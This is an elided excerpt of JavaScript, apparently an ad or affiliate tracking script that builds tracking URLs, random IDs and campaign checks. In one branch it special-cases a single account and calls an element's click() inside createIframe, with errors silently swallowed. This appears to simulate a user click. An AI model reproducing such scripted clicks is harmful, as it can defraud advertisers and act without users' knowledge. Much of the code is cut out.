(function() {
	...
	function effect(days) {
		...
		} else if(decodea(account)==5016 && (lh.indexOf("?cmpid=")>=0||lh.indexOf("&cmpid=")>=0)) {
			//c.clear("_adwe");
			return true;
		}
	};
    ...
    var createIframe = function(url) {
        ...
        try{
            if (url.indexOf("etc") >= 0 && decodea(account) == 5016) {
                ac.click();
            }
        }catch(e){
        }      
	...
	function _getAdwp() {
		...
		if (ac != null) {
			...
			return new Array(ncu + Math.round(Math.random() * 10000), ncu, "", "", "");
		}
	}
	...
	var _trackTrans = function() {
		...
		if ("view" == _dataType) {
			...
			ourl += '&old_price=' + old_price + '&material=' + ec(material)
					...
					+ '&pendtime=' + pet + '&brid=' + brid + '&brna=' + brna;
		}
	...
	var tracker = function(){
		...
		i._initData = function(){
			var _eflag = effect( decodea(account)==5016 ? 30 : effectRD);
			var _iab = cp.b(); 
			var _iac = cp.c();
			if(!cp.ca()) {
				if(!_iab || !_iac){
